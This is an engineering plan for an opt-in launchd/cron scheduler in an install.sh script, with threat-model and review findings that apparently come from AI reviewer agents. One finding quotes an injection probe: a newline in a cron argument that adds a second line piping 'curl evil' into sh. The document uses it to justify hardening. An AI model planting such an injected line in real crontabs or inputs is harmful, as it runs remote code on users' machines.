---
lifecycle: ephemeral
archive-after: 2026-07-31
---

# Ghost Heartbeat W2-PR3b — the `install.sh` launchd/cron opt-in scheduler offer

**Status:** PLAN (pre-VERIFY)
**Arc:** Ghost Heartbeat Wave 2 — the LAST piece (producer #369 → Stop-carrier #371 →
drain-runner #373 → **this: the schedule offer**).
**Routing:** `route-decide.js` → `root` (score 0 — the stakes lexicon has no token for
scheduler infra). **Escalated to the full per-wave workflow by judgment**: standing USER
directive ("same rigor — this is a meta-improvement task for the whole env"), zero scheduler
precedent (net-new infra class), and a CLEAN-ENV dogfood obligation (H.7.15). Ultracode-on.

## Goal (one sentence)

Give the user an explicit, reversible, CI-safe way to *schedule* the already-built
drain runner (`ghost-heartbeat-run.js`) as a background task — `launchd` on macOS,
`cron` on Linux — so the advisory drift heartbeat can actually run unattended, **while
keeping it default-OFF**: scheduling is the opt-in act, unscheduling is the off-switch.

## Non-goals (scope fence)

- **NOT** turning the heartbeat on by default. `install.sh --all` still installs nothing
  scheduled; it only *prints an offer*. The user must run `--schedule-heartbeat` explicitly.
- **NOT** scheduling the `${CLAUDE_PLUGIN_ROOT}` plugin-path runner. That path churns on
  every `claude plugin update`, so a hardcoded schedule would silently break. install.sh
  is the LEGACY path (its own header says so) → it schedules the stable, install.sh-managed
  `~/.claude/packages/kernel/spawn-state/ghost-heartbeat-run.js` copy. Plugin-path-stable
  scheduling is a separate, harder problem → deferred (noted in OQ-PR3b-1).
- **NOT** an interactive `read -p` prompt. install.sh is fully flag-driven and CI-run under
  `set -euo pipefail`; a prompt would hang a non-tty/CI invocation. The "offer" is a printed
  NOTE + two explicit flags. (Design decision D1 below; pressure-tested at VERIFY.)
- **NOT** any action-gate. The heartbeat stays advisory/draft-only (narrows-not-hardens);
  scheduling adds NO new authority. integrity≠provenance is unchanged (no new writer).

## Design (proposed — to be VERIFY-pressure-tested)

Two artifacts, SRP-split (mirrors PR-3a's "separate module, not a flag on the runner"):

### Artifact 1 — `packages/kernel/spawn-state/ghost-heartbeat-schedule.js` (NEW)

A node module + CLI carrying ALL the OS-aware logic (testable; bash is a thin shell over it).
**Pure-core / effect-shell seam** so tests + dogfood never touch the real scheduler:

- `detectOs()` → `'darwin' | 'linux' | 'unsupported'` (via `process.platform`, NOT shelling
  `uname` — `process.platform` is the node-native, test-stubbable equivalent).
- `buildLaunchdPlist({ label, nodeBin, runnerPath, intervalSec, stdoutPath, stderrPath })`
  → plist XML **string** (PURE). Runs the runner with `EnvironmentVariables`
  `GHOST_HEARTBEAT_EMIT=1`, `StartInterval` = intervalSec, `RunAtLoad` false,
  `ProcessType` Background, `Nice` 10 (advisory, low-priority).
- `buildCronLine({ nodeBin, runnerPath, intervalCron, marker })` → a single crontab line,
  `GHOST_HEARTBEAT_EMIT=1 <nodeBin> <runnerPath> >> <log> 2>&1`, prefixed/suffixed by a
  unique **marker comment** (`# power-loom-ghost-heartbeat`) so re-install/uninstall can
  find-and-replace exactly our line (PURE).
- `install({ os, paths, intervalSec, dryRun, effects })` — the EFFECT shell. `effects` is an
  injected seam: `{ launchAgentsDir, readCrontab(), writeCrontab(text), loadLaunchd(plistPath),
  unloadLaunchd(label) }`. Default `effects` does the real thing; tests/dogfood inject stubs +
  a temp dir. Idempotent: darwin → unload+rm+write+load (replace); linux → strip any
  marked block then append (replace).
- `uninstall({ os, paths, effects })` — darwin: unload label + rm plist; linux: strip the
  marked block. Idempotent (absent → no-op, exit ok).
- `status({ os, paths, effects })` — report installed/not, without mutating.
- CLI: `node ghost-heartbeat-schedule.js <install|uninstall|status> [--dry-run]`. **Always
  exits 0** unless `--dry-run` is asked and prints to stdout (advisory infra: a scheduler/
  installer must never see a hard failure abort the rest of install.sh).

**Default cadence:** every 4 hours (`intervalSec` 14400; cron `0 */4 * * *`). The runner is
already self-bounded (≤20 sessions, ≤4-min budget, mtime cost-map), so 4h is conservative.
Env-overridable via `GHOST_HEARTBEAT_SCHEDULE_INTERVAL_SEC` (clamped, whole-digit) — but a
fixed sane default is the KISS path; configurability is thin.

### Artifact 2 — `install.sh` additions

- `usage()` — document `--schedule-heartbeat` / `--unschedule-heartbeat` under a new
  "Ghost heartbeat (advisory drift detection)" group.
- arg `case` + two bool vars (`SCHEDULE_HEARTBEAT` / `UNSCHEDULE_HEARTBEAT`).
- Dispatch: each shells out to
  `node "$CLAUDE_DIR/packages/kernel/spawn-state/ghost-heartbeat-schedule.js" install|uninstall`.
  Guard: if the runner/module isn't installed yet, print "run --hooks first" and skip (no abort).
- `--diff --schedule-heartbeat` → pass `--dry-run` to the module (preview plist/cron, mutate
  nothing).
- An **offer NOTE** at the end of a normal `--all`/`--hooks` install (printed, non-interactive):
  what it is, that it's OFF, and the one-liner to enable/disable.

### Artifact 3 — tests

- `tests/unit/scripts/ghost-heartbeat-schedule.test.js` — node unit suite over the
  pure generators + the injected-effect install/uninstall/idempotency/status round-trips.
  (Lives in `tests/unit/scripts/` next to its ghost-heartbeat siblings, NOT under
  `tests/unit/kernel/` — VALIDATE honesty LOW corrected the original plan path.)
- `tests/smoke-ghost-heartbeat-schedule.sh` — sourced by `run_smoke_tests` (next numbers
  125+): the `--dry-run` CLI prints a well-formed plist (darwin) / cron line; `plutil -lint`
  the generated plist on darwin; the unschedule-when-absent no-op exits 0.

## Runtime Probes (claims verified against the ACTUAL repo, not memory/prose)

| Claim | Probe | Result |
|---|---|---|
| install.sh is fully flag-driven, no `read -p` | `grep -n "read -p\|read -r.*REPLY" install.sh` | (probe at build) — recon read showed zero interactive prompts; arg-parse `case` only |
| The runner is installed to `~/.claude/packages/kernel/spawn-state/` | read `install_hooks_kernel` §4 (`for sub in recall spawn-state algorithms schema; do cp -r "$k_src/$sub"/* …`) | CONFIRMED — spawn-state/*.js copied to `$CLAUDE_DIR/packages/kernel/spawn-state/` |
| Zero scheduler precedent (net-new infra) | `grep -rIl -E "launchctl\|launchd\|crontab\|StartInterval\|plutil\|uname -s\|LaunchAgents" --include=*.sh --include=*.js .` | CONFIRMED — only the runner's own doc-comment + an unrelated `_h70-test.js` string; no real precedent |
| The runner CLI is opt-in `GHOST_HEARTBEAT_EMIT=1`, killswitch `GHOST_HEARTBEAT_DISABLED=1`, exits 0 | read `ghost-heartbeat-run.js:111-167` | CONFIRMED — `runHeartbeat` checks killswitch then `EMIT!=='1'` → opt-out; CLI `process.exit(0)` always |
| Smoke tests source `tests/smoke-*.sh`, mutate parent `passed`/`failed`, errexit-safe `TNN_EXIT=0 \|\| TNN_EXIT=$?` | read `run_smoke_tests()` + `tests/smoke-drift-gates.sh` | CONFIRMED — sequential numbering, last seen 124+ |
| `process.platform` is `'darwin'`/`'linux'` (no `uname` shell needed) | node doc / `node -e "console.log(process.platform)"` | (probe at build) — node-native, stubbable |
| `plutil -lint` validates a plist WITHOUT loading it | `plutil -lint <file>` on a generated plist (darwin only) | (probe at build/dogfood) |

## Threat model + safety (the risky-infra core)

1. **Scheduling mutates the user's real login session / crontab.** The build/dogfood MUST NOT
   silently start a real `claude -p` heartbeat on the user's machine. Mitigation: the effect
   shell is INJECTED — all unit tests + the automated dogfood write to a TEMP `launchAgentsDir`
   and a stubbed crontab, validated by `plutil -lint` (syntax, no load). **A real `launchctl
   load` of the real runner is the USER's explicit post-merge opt-in act** (gated behind the
   flag they run), exactly like PR-2's "definitive dogfood gated post-`claude plugin update`".
   The plan does NOT auto-load anything into the user's scheduler.
2. **Idempotency / no duplicate schedules.** Re-running `--schedule-heartbeat` must REPLACE,
   not stack. darwin: unload+rm+write+load. linux: a unique marker comment bounds a strip-then-
   append. (Tested: install twice → exactly one entry.)
3. **Path injection into the plist/cron.** `nodeBin`/`runnerPath` are install-derived absolute
   paths, not user input — but the plist XML MUST escape `& < >` and the cron line must reject a
   path containing a newline (a newline would inject a second crontab line). Validate both.
4. **The scheduled minimal env lacks the killswitch var.** `GHOST_HEARTBEAT_DISABLED=1` won't be
   set in the launchd/cron env, so the runner WILL run once scheduled. That's intended (the
   schedule IS the opt-in). The documented off-switch is `--unschedule-heartbeat`. (A touch-file
   killswitch the runner checks is a possible future nicety — out of scope; noted OQ-PR3b-2.)
5. **No new authority / no action-gate.** Scheduling adds nothing that gates an action; counts
   stay advisory. integrity≠provenance unchanged.
6. **Fail-open everywhere.** The module exits 0 on any error; install.sh's scheduler step never
   aborts the rest of the install (a missing `node`, an unwritable LaunchAgents, a `launchctl`
   that errors → print + continue).

## Acceptance gates (Definition of Done)

- [x] `ghost-heartbeat-schedule.js` pure generators produce a `plutil -lint`-clean plist
      (validated ON DARWIN — the `plutil` smoke branch is `uname`-gated; on a non-darwin
      runner only the cron-block branch runs, and the plist generator is covered by the
      unit suite's string assertions, NOT plutil) + a single well-formed marked cron block.
- [ ] install/uninstall are idempotent under an injected effect shell (install×2 → one entry;
      uninstall-when-absent → no-op exit 0).
- [ ] `install.sh --schedule-heartbeat` / `--unschedule-heartbeat` / `--diff --schedule-heartbeat`
      wired; the offer NOTE prints on `--all`/`--hooks`; CI-safe (no hang on non-tty).
- [ ] New node unit suite green; new smoke tests green; `bash install.sh --hooks --test` →
      all pass; full kernel suite green; eslint/yaml/markdownlint clean (ASCII-only, backticked
      underscore tokens).
- [ ] CLEAN-ENV dogfood (H.7.15): run the scheduler logic against a temp LaunchAgents dir +
      stubbed crontab on a path WITHOUT a populated `~/.claude` (the module is self-contained) —
      honestly record what was live-validated vs generated-only (linux cron = generated +
      unit-tested, NOT live-dogfooded; no linux env).
- [ ] 3-lens VALIDATE on the diff (code-reviewer + hacker live-re-probe + honesty-auditor),
      then CodeRabbit (poll inline+reviews surfaces, not the status-check).

## HETS Spawn Plan

- **VERIFY (pre-build, parallel 3-lens over THIS plan):**
  - `architect` — design soundness: the pure/effect seam, the legacy-vs-plugin-path scoping (D1),
    the interaction model (flags-not-prompt), default cadence, and whether the SRP split is right.
  - `code-reviewer` — install.sh integration correctness: arg-parse, errexit-safety, the
    `$INSTALL_X && install_x` dispatch ordering, smoke-test wiring, idempotency mechanics.
  - `hacker` — adversarial: plist/cron injection (newline, XML metachar), the scheduled-env
    killswitch gap, a malicious `runnerPath`, symlink/temp-dir races in the effect shell,
    whether the dogfood can leak a real scheduled task onto the user's machine.
- **VALIDATE (post-build, parallel 3-lens over the DIFF):** `code-reviewer` (correctness) +
  `hacker` (LIVE-probe the BUILT module — actually generate a plist, `plutil -lint` it, run the
  injected-effect round-trip, attempt a newline-injection) + `honesty-auditor` (every "validated"
  claim vs the actual artifact; the live-vs-generated-only honesty boundary).

## Design decisions (the forks — defaulted, surfaced for the merge gate)

- **D1 — interaction model:** explicit flags + printed offer NOTE (CI-safe), NOT an interactive
  prompt. Rationale: install.sh is flag-driven under `set -euo pipefail`; a prompt hangs CI.
- **D2 — scope the LEGACY runner path**, not `${CLAUDE_PLUGIN_ROOT}` (churns on plugin update).
- **D3 — default cadence every 4h** (fixed; the env-override was DROPPED per VERIFY #14 —
  YAGNI + it would let the launchd/cron cadences diverge); runner is already self-bounded.
- **D4 — SRP split**: a node module owns the logic (unit-testable); bash is a thin caller.

## Open questions (deferred, non-blocking)

- **OQ-PR3b-1** — plugin-path-stable scheduling (survive `claude plugin update`): a wrapper that
  resolves the current plugin root at run time, or scheduling the legacy copy as the stable
  anchor. Deferred; PR-3b schedules the legacy copy.
- **OQ-PR3b-2** — a touch-file killswitch the runner honors (pause without unscheduling).
  ADDRESSED in this PR (VERIFY #12): the runner lstat-checks `~/.claude/checkpoints/
  ghost-heartbeat.disabled` at start (mechanism wired + R16 unit-proven). RESIDUAL: the
  scheduled-minimal-env read path is unexercised until a real scheduled run.

## Pre-Approval Verification (VERIFY board — folded 2026-06-19)

3-lens parallel board (architect + code-reviewer + hacker) over this plan. All three
**APPROVE-WITH-CHANGES** (no NEEDS-REVISION). The hacker confirmed THREE exploits by
`/tmp` probe. Dispositions (all folded into the design before build):

| # | Lens | Sev | Finding | Disposition |
|---|---|---|---|---|
| 1 | arch | HIGH | `nodeBin` under launchd/cron minimal PATH (`/usr/bin:/bin:…`) — bare `node` exits 127 silently | **FOLD** — bake `process.execPath` (absolute) as ProgramArguments[0] / cron interpreter; acceptance gate asserts an absolute, on-disk node path |
| 2 | hacker | HIGH | cron newline injection (probe: `nodeBin=$'…\\n* * * * * curl evil\|sh'` → 2nd live crontab line) | **FOLD** — `assertSafeArg()` contract pre-condition rejects `[ -]`+`%`; unit test feeds a newline, asserts refusal |
| 3 | hacker | HIGH | `plutil -lint` returns `OK` on a newline-bearing `<string>` (catches `&<>`, blind to ctrl chars) | **FOLD** — node-side content gate is the authority (xml-escape `&<>"'` + ctrl-char reject); `plutil` is a wellformedness backstop only |
| 4 | hacker | HIGH | `--diff --schedule-heartbeat` plants a REAL task (install.sh dispatch is unconditional; DRY_RUN checked *inside* fns) | **FOLD** — dispatch translates `$DRY_RUN`→`--dry-run`; module `install()` short-circuits before ANY effect when `dryRun`; smoke asserts ZERO mutation on `--diff` |
| 5 | hacker | HIGH | uninstall `grep -v marker` over-deletes a user line that merely mentions the marker | **FOLD** — exact-full-line BEGIN/END sentinels (`# >>> power-loom-ghost-heartbeat (DO NOT EDIT) >>>` … `# <<< … <<<`); strip only the inclusive exact-match span; BEGIN-without-END → strip nothing (fail-open); unit test: a user comment with the marker substring survives |
| 6 | code-rev | HIGH | dispatch ordering unspecified; guard checks wrong file | **FOLD** — schedule dispatch placed AFTER `$INSTALL_HOOKS && install_hooks`; guard checks `…/ghost-heartbeat-run.js` (the RUNNER), not the schedule module |
| 7 | code-rev | HIGH | missing `source tests/smoke-ghost-heartbeat-schedule.sh` in `run_smoke_tests()` | **FOLD** — add the source line after the smoke-drift-gates.sh line |
| 8 | arch | MED | module placement in `spawn-state/` is SRP-by-directory misfit | **DOCUMENTED TRADE-OFF (keep in spawn-state/)** — co-located with the runner it schedules (same ghost-heartbeat feature = genuine cohesion), rides the existing `for sub in … spawn-state …` copy loop (KISS, no new install surface / no H.7.15 subdir-glob risk). Architect offered this as acceptable. |
| 9 | arch | MED | D2 legacy-path staleness consequence not surfaced | **FOLD** — see Consequences below |
| 10 | code-rev | MED | `crontab -l` exits 1 on no-crontab | **FOLD** — `readCrontab()` maps status≠0 + stderr `no crontab` → `''`; other non-zero → throw |
| 11 | code-rev | MED | single-line vs prefixed/suffixed marker contradiction | **FOLD** — resolved by #5 (BEGIN/END block supersedes the single trailing comment) |
| 12 | hacker | MED | env killswitch (`GHOST_HEARTBEAT_DISABLED`) is INERT for the scheduled minimal-env task | **FOLD (ADDRESSES OQ-PR3b-2 — mechanism wired + R16 unit-proven; the scheduled-minimal-env `$HOME` read is unexercised until a real scheduled run)** — the runner ALSO honors a touch-file killswitch (`~/.claude/checkpoints/ghost-heartbeat.disabled`, lstat-checked at start); the scheduled process can read `$HOME` even with no env. Document BOTH off-switches. (VALIDATE honesty down-rated "closes" → "addresses": the runner-honors-the-file path is unit-proven, the launchd/cron-minimal-env read is not end-to-end exercised.) |
| 13 | arch | LOW | smoke-test invocation target ($SCRIPT_DIR vs $CLAUDE_DIR) | **FOLD** — smoke test exercises the SOURCE module via `$SCRIPT_DIR` (survives clean CI); install.sh dispatch targets the installed `$CLAUDE_DIR` copy |
| 14 | arch | LOW | `GHOST_HEARTBEAT_SCHEDULE_INTERVAL_SEC` is YAGNI + launchd/cron cadence can diverge | **FOLD (DROP it)** — fixed 4h, no env override; add tunability later if a need appears |
| 15 | arch/code-rev | LOW | offer NOTE must not print under `--diff` | **FOLD** — NOTE printed inside `install_hooks()` after the real install, never under DRY_RUN |
| 16 | code-rev | LOW | `plutil` platform guard in the smoke test | **FOLD** — wrap in `if [ "$(uname -s)" = "Darwin" ]` |
| 17 | hacker | LOW | same-uid symlink at the plist path (atomic-write follows same-uid) | **FOLD** — plist write lstat-no-follows the final target and REFUSES a symlink (stricter than atomic-write's same-uid concession; justified for a security-sensitive plist); VALIDATE hacker live-probes the real effect path |
| 18 | code-rev | NIT | plan grammar "exits 0 unless --dry-run" | noted; CLI always exits 0, prints on `--dry-run` |

**Consequences (D2, folded from arch #9):** scheduling is COUPLED to the legacy
`install.sh` path — the scheduled runner is only as fresh as the last `install.sh --hooks`
run, and a plugin-only user (who never ran install.sh) must run it at least once before
`--schedule-heartbeat` works (the guard prints "run --hooks first" otherwise). Acceptable
for an advisory/draft-only feature; OQ-PR3b-1 (plugin-path-stable scheduling) is the
principled close.

## VALIDATE result (post-build 3-lens board — folded 2026-06-19)

3-lens parallel board over the DIFF: `code-reviewer` + `hacker` (14 live `/tmp` probes,
Rule 2a) + `honesty-auditor`. All three **APPROVE-WITH-CHANGES**. The hacker confirmed
EVERY load-bearing security invariant HELD on the shipped path (no exploitable bypass):
dry-run plants nothing; every injection vector (newline/CR/NUL/tab/`%`) is rejected or a
single-quote is neutralized to one shell-literal arg; the injected-effect round-trip is
idempotent and a user line mentioning the marker substring survives uninstall; the real
`writePlist` refuses a symlink; the touch-file killswitch short-circuits. Folds:

| # | Lens | Sev | Finding | Disposition |
|---|---|---|---|---|
| V1 | code-rev | HIGH | a literal NUL byte at test `:48` renders as a space, so the line READS as "rejects a space" (spaces are intentionally allowed) | **FOLD** — replaced the invisible NUL with the explicit `\x00` escape; the test now visibly asserts NUL-rejection (it always passed for that reason) |
| V2 | hacker | MED | `launchctl load` status was discarded → a failed load reports success while the agent never fires | **FOLD** — `install()` captures the load status, returns `loaded:<bool>`, and logs `launchctl-load-nonzero`; still fail-open (a bad load never aborts). Unit-tested both arms |
| V3 | hacker | LOW | `label` was not validated before `path.join` → a `../` label could escape the LaunchAgents dir (latent; not reachable on the shipped DEFAULT_LABEL path) | **FOLD** — `assertSafeLabel` (allow-list `^[A-Za-z0-9._-]+$`) gates `plistPathFor`; unit-tested |
| V4 | code-rev | LOW | install.sh `:397` told the user to "remove with --unschedule-heartbeat" to undo the PAUSE (that flag removes the whole task) | **FOLD** — reworded to "resume: rm that file" |
| V5 | hacker | LOW | an em-dash on the added runner comment line (ASCII-only rule) | **FOLD** — `--`; all 3 touched/created source files now 0 non-ASCII |
| V6 | code-rev | NIT | linux uninstall dry-run issued a real `crontab -l` before the dryRun return | **FOLD** — dryRun check moved before `readCrontab` (true zero-effect on both arms) |
| V7 | honesty | NIT | `status()` linux keyed on BEGIN only → a dangling BEGIN reported installed | **FOLD** — requires a COMPLETE BEGIN+END span; unit-tested |
| V8 | honesty | LOW/MED | plan staleness (test path) + "closes OQ-PR3b-2" overstatement + plutil-gate scope | **FOLD** — corrected the Artifact-3 path, down-rated #12 to "addresses", scoped the plutil gate to darwin (above) |

**Negative-attestation (the live-vs-generated boundary — what was ACTUALLY run this session):**

- **darwin/launchd: LIVE-PROVEN end-to-end.** The orchestrator ran a REAL `launchctl`
  round-trip through the module's own effect code — `buildLaunchdPlist` → `defaultEffects.writePlist`
  (tmp+rename, symlink-refuse) → REAL `launchctl load` (confirmed REGISTERED via `launchctl list`)
  → REAL `launchctl unload` → plist removed; teardown verified (nothing labeled ghost-heartbeat
  remains in launchd or `~/Library/LaunchAgents`). Throwaway label + `/usr/bin/true` + `RunAtLoad
  false` so nothing ever fired. `plutil -lint` of the generated plist = `OK`.
- **linux/cron: GENERATED + UNIT-TESTED ONLY, NOT live-dogfooded.** The strip-then-append
  idempotency, the marker-collision safety, and the no-crontab mapping are proven under INJECTED
  stubs; a REAL `crontab -`/`crontab -l` and a real cron fire were NEVER exercised (no linux env).
- **The scheduled-minimal-env path** (a real launchd/cron process reading `$HOME` for the
  killswitch + finding the installed runner) is the user's post-merge opt-in act — NOT exercised
  in-session (by design; the effect shell is injected and dry-run does zero effect).

## Drift Notes

- route-decide returned `root` for genuinely architectural infra (scheduler, OS-conditional,
  clean-env-dogfood) — the recurring substrate-meta `stakes`-lexicon miss. Escalated by judgment
  per the documented rule. Dictionary-expansion candidate: a `scheduler`/`launchd`/`cron`/`infra`
  stakes token. (Captured for session-end review, not acted on mid-task.)
